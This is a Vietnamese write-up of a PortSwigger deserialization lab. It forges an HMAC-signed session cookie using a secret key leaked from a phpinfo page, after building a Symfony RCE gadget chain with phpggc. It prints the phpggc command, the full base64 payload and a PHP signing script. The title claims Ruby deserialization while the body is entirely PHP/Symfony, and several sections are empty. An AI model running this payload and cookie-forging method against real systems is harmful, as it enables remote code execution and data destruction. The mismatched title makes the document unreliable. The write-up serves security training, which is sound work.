# Write-up: Exploiting Ruby deserialization using a documented gadget chain

### Tổng quan

### Mục tiêu

### Công cụ sử dụng
- Burp Suite Pro
- Firefox Browser

### Quy trình khai thác

- đăng nhập tài khoản wiener:peter
- quan sát tham số cookie được mã hóa url có dạng: 

{"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vxueywcgte94uxyfh3f2lndhm3g11c1b";}","sig_hmac_sha1":"f83cd84d4fe211e2f08f06b569ae9337f574a340"}
    - giá trị cookie này có 2 phần là phần token với mã base64 được mã hóa và một phần sig_hmac_sha1 để đảm bảo tính toàn vẹn

- thử sửa giá trị token và gửi đi ta nhận được thông báo
    PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
    - biết rằng cần phải đảm bảo tính toàn vẹn
    - ta còn biết app chạy Symfony Version: 4.3.6 
    - endpoints lạ /cgi-bin/phpinfo.php check được secret-key: zyj46hv5z38knddz478f9x9lmhhshme2 


- ta sẽ sử dụng tool phpggc để khai thác 
- ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0 trả về một chuỗi kí tự được encode base64
- tạo file php tự động hóa theo đúng định dạng signature 
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "zyj46hv5z38knddz478f9x9lmhhshme2";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;

- chạy đoạn mã trên và ta đượccookie mới. gửi bằng burp repeater và load lại page trên browser 
- hoàn thành lab 


### Bài học rút ra

### Kết luận
Lab này cung cấp kinh nghiệm thực tiễn trong việc khai thác deserialization để leo thang đặc quyền, nhấn mạnh cần thiết phải bảo vệ dữ liệu session và kiểm tra dữ liệu trước khi xử lý. Xem portfolio đầy đủ tại https://github.com/Furu2805/Lab_PortSwigger.

*Viết bởi Toàn Lương, Tháng 9/2025.*